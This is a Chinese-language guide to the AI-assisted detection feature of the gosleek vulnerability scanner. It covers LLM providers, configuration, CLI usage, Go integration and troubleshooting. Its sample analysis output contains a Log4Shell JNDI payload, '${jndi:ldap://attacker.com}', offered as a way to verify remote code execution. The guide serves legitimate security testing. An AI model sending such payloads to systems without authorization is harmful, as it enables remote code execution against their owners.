# Go-Sleek AI 辅助检测指南

> 版本：v1.7.0
> 目标读者：安全工程师、渗透测试人员
> 前置知识：了解 gosleek 基本扫描流程

---

## 目录

1. [概述](#1-概述)
2. [支持的 AI 提供商](#2-支持的-ai-提供商)
3. [实时 AI 分析（扫描过程中）](#3-实时-ai-分析扫描过程中)
4. [离线 AI 分析（扫描后）](#4-离线-ai-分析扫描后)
5. [配置指南](#5-配置指南)
6. [编程集成](#6-编程集成)
7. [最佳实践](#7-最佳实践)
8. [常见问题](#8-常见问题)

---

## 1. 概述

gosleek 支持通过 LLM（大语言模型）进行 **AI 辅助检测**，提供两大应用场景：

### 1.1 实时 AI 分析（扫描过程中）

在扫描过程中，每条命中的漏洞结果会异步发送给 AI 进行：

- **置信度评分**：量化 AI 对漏洞判断的置信度
- **风险评估**：AI 生成专业的漏洞影响描述
- **验证建议**：下一步验证方法的建议
- **误报过滤**：设置 `min-confidence` 阈值，自动过滤低置信度结果

### 1.2 离线 AI 分析（扫描后）

扫描完成后，可以对 JSON 结果文件进行批量 AI 分析：

```bash
gosleek ai -i results.json
```

输出每条结果的：
- AI 确认判断（confident: true/false）
- 置信度百分比
- 风险评估描述
- 验证建议列表

**设计原则**：
- 零额外框架依赖，仅使用 OpenAI 兼容 API
- 实时分析在独立 goroutine 中执行，不阻塞扫描主流程
- 支持 7 种主流 AI 提供商

---

## 2. 支持的 AI 提供商

| 提供商 | Base URL | API Key | 推荐模型 | 延迟 |
|--------|----------|---------|----------|------|
| **OpenAI** | `https://api.openai.com/v1` | ✅ 需要 | `gpt-4o-mini` | ~1-3s |
| **DeepSeek** | `https://api.deepseek.com/v1` | ✅ 需要 | `deepseek-chat` | ~1-2s |
| **Kimi** | `https://api.moonshot.cn/v1` | ✅ 需要 | `moonshot-v1-8k` | ~2-4s |
| **GLM（智谱）** | `https://open.bigmodel.cn/api/paas/v4` | ✅ 需要 | `glm-4-plus` | ~2-4s |
| **Agnes** | `https://api.sapiens.ai/v1` | ✅ 需要 | `agnes-flash` | ~1-2s |
| **Ollama（本地）** | `http://localhost:11434/api` | ❌ 不需要 | `llama3` / `mistral` | ~3-10s |
| **Azure OpenAI** | 自定义 | ✅ 需要 | `gpt-4` | ~2-5s |

**选择建议**：
- 快速部署：DeepSeek（速度快、成本低）
- 高精度分析：OpenAI GPT-4o 或 GLM-4
- 隐私要求：本地 Ollama
- 企业环境：Azure OpenAI 或 Agnes

---

## 3. 实时 AI 分析（扫描过程中）

### 3.1 启用方式

在 `config.yaml` 中配置：

```yaml
ai:
  enabled: true
  provider: deepseek
  model: deepseek-chat
  api-key: "your-api-key"
  timeout: 30
  min-confidence: 0.8
```

或通过命令行参数启用：

```bash
gosleek scan -t http://target \
  --ai \
  --ai-provider deepseek \
  --ai-model deepseek-chat
```

### 3.2 工作流程

```
扫描请求 → 匹配器命中 → 结果入 resultsCh
                                        │
                                        ▼
                              异步 goroutine
                                        │
                                        ▼
                              AI 分析请求
                                        │
                              ├─ 超时/失败 → 原结果直接输出
                              │
                              └─ 成功 → 置信度判断
                                        │
                              ├─ < min-confidence → 过滤掉
                              │
                              └─ >= min-confidence → 输出结果 + 打印 AI 建议
```

### 3.3 关键参数

| 参数 | 说明 | 默认值 |
|------|------|--------|
| `--ai` | 启用实时 AI 分析 | false |
| `--ai-provider` | AI 提供商名称 | openai |
| `--ai-model` | AI 模型名称 | config.yaml 中配置 |
| `--ai-min-confidence` | 最小置信度阈值（0.0-1.0） | 0.0（不过滤） |

### 3.4 输出示例

```
[2026-08-25 14:30:01] [INFO] task started  target=http://example.com/vuln  template=CVE-2021-44228
[2026-08-25 14:30:02] [INFO] + CVE-2021-44228-log4j-rce [critical]  http://example.com/vuln  matched-at: body  evidence: JNDI注入检测成功

  AI 分析: CVE-2021-44228 - Log4Shell RCE
    置信度: 95%
    风险评估: 高风险：响应中确认包含 JNDI 注入 payload，可直接远程代码执行
  [AI 确认] CVE-2021-44228 [critical]  http://example.com/vuln  置信度=95%  高风险：响应中确认包含 JNDI 注入 payload
```

---

## 4. 离线 AI 分析（扫描后）

### 4.1 基本用法

```bash
# 分析扫描结果文件
gosleek ai -i results.json

# 指定提供商和模型
gosleek ai -i results.json -p deepseek -m deepseek-chat

# 显示详细建议
gosleek ai -i results.json -v

# 使用本地 Ollama
gosleek ai -i results.json -p ollama -m llama3
```

### 4.2 输出格式

```
  AI 辅助分析
  Provider:  deepseek
  Model:     deepseek-chat
  结果数:    5

  [1/5] 分析: CVE-2021-44228 - Log4Shell RCE
    置信度:    95%
    风险评估:  高风险：响应中包含 JNDI 注入 payload，存在 RCE 风险
    建议:
      - 尝试发送 ${jndi:ldap://attacker.com} 验证 RCE
      - 检查 Log4j 版本是否受影响

  ...
```

---

## 5. 配置指南

### 5.1 config.yaml 配置

```yaml
# === AI 辅助分析配置 ===
ai:
  enabled: true                     # 是否启用 AI 辅助分析
  provider: deepseek                # openai / deepseek / kimi / glm / ollama / agnes / azure
  model: deepseek-chat              # 模型名称
  base-url: ""                      # API Base URL（留空使用默认）
  api-key: "your-api-key"           # API Key
  timeout: 30                       # 单次请求超时秒数
  min-confidence: 0.8               # AI 确认的最小置信度（0.0-1.0）

  # 各 Provider 默认配置
  openai:
    base-url: "https://api.openai.com/v1"
    model: gpt-4o-mini
  deepseek:
    base-url: "https://api.deepseek.com/v1"
    model: deepseek-chat
  kimi:
    base-url: "https://api.moonshot.cn/v1"
    model: moonshot-v1-8k
  glm:
    base-url: "https://open.bigmodel.cn/api/paas/v4"
    model: glm-4-plus
  ollama:
    base-url: "http://localhost:11434/api"
    model: llama3
  agnes:
    base-url: "https://api.sapiens.ai/v1"
    model: agnes-flash
  azure:
    base-url: ""
    api-key: ""
    deployment: ""
```

### 5.2 环境变量

```bash
# API Key 也可以通过环境变量设置
export AI_API_KEY="your-api-key"
```

---

## 6. 编程集成

### 6.1 基本用法

```go
package main

import (
    "context"
    "log"

    "github.com/gosleek/gosleek/internal/ai"
    "github.com/gosleek/gosleek/internal/config"
    "github.com/gosleek/gosleek/internal/engine"
    "github.com/gosleek/gosleek/pkg/types"
)

func main() {
    cfg := config.DefaultConfig()

    // 创建引擎
    scanner := engine.NewScanner(cfg, 0, engine.OOBConfig{}, "", false)

    // 设置 AI 实时分析
    provider := ai.NewOpenAIProvider(
        "your-api-key",
        "https://api.deepseek.com/v1",
        "deepseek-chat",
        "deepseek",
        30,
    )
    scanner.SetAICallback(provider, 0.8, func(resp *ai.AnalyzeResponse, result *types.Result) {
        log.Printf("AI 确认: %s [%s]  置信度=%.0f%%",
            result.TemplateID, result.Name, resp.Confidence*100)
    })

    // 设置结果回调
    scanner.SetCallbacks(
        func(r *types.Result) {
            log.Printf("命中: %s -> %s [%s]", r.Target, r.Name, r.Severity)
        },
        nil, nil, nil, nil, nil,
    )

    // 运行扫描
    templates := loadTemplates("templates")
    results := scanner.Run(context.Background(), templates, nil, []string{"http://example.com"})

    log.Printf("扫描完成，共 %d 条结果", len(results))
}
```

### 6.2 多提供商切换

```go
// 创建不同的 AI 提供商
providers := map[string]ai.Provider{
    "openai":  ai.NewOpenAIProvider("key", "https://api.openai.com/v1", "gpt-4o", "openai", 30),
    "deepseek": ai.NewOpenAIProvider("key", "https://api.deepseek.com/v1", "deepseek-chat", "deepseek", 30),
    "kimi":    ai.NewOpenAIProvider("key", "https://api.moonshot.cn/v1", "moonshot-v1-8k", "kimi", 30),
    "ollama":  ai.NewOpenAIProvider("", "http://localhost:11434/api", "llama3", "ollama", 60),
}

// 注册到全局
ai.Register("deepseek", providers["deepseek"])
ai.Register("ollama", providers["ollama"])

// 使用
provider, _ := ai.Get("deepseek")
```

---

## 7. 最佳实践

### 7.1 选择合适的模型

| 场景 | 推荐模型 | 原因 |
|------|----------|------|
| 快速批量分析 | `deepseek-chat` | 速度快、成本低 |
| 高精度分析 | `gpt-4o` / `glm-4-plus` | 推理能力强 |
| 本地部署 | `llama3` / `mistral` | 隐私保护 |
| 超低延迟 | `agnes-flash` | 极速响应 |

### 7.2 控制分析成本

```yaml
# 只对高严重度结果进行 AI 分析
ai:
  min-confidence: 0.8  # 低置信度结果过滤
  timeout: 15          # 减少超时等待
```

### 7.3 并行分析

AI 分析在独立 goroutine 中执行，不会阻塞扫描主流程。大量结果时：

```go
// 使用更快的模型和更短的超时
provider := ai.NewOpenAIProvider(
    "key", "https://api.deepseek.com/v1", "deepseek-chat", "deepseek", 15,
)
scanner.SetAICallback(provider, 0.7, nil)
```

### 7.4 组合使用

- **实时分析 + 离线分析**：扫描时实时过滤，结束后批量深度分析
- **多提供商**：高严重度用 GPT-4，普通结果用 DeepSeek

---

## 8. 常见问题

### 8.1 API Key 不正确

```
Error: AI API 返回错误状态码 401: {"error":{"message":"Invalid API key"}}
```

**解决**：检查 API Key 是否正确，确认账户余额充足。

### 8.2 请求超时

```
Error: context deadline exceeded
```

**解决**：
- 增加 timeout 参数
- 使用更快的模型（如 deepseek-chat）
- 检查网络连接

### 8.3 响应格式错误

```
Error: failed to parse AI response
```

**解决**：
- 确保模型支持 JSON 输出
- 检查响应是否包含 markdown 代码块（已自动去除）
- 尝试更换模型

### 8.4 Ollama 模型未加载

```
Error: model not found
```

**解决**：
```bash
# 下载模型
ollama pull llama3

# 确认模型可用
ollama list
```

### 8.5 低置信度结果被过滤

**解决**：降低 `min-confidence` 阈值：

```yaml
ai:
  min-confidence: 0.5  # 降低过滤阈值
```

---

*本文档基于 gosleek v1.7.0 编写*
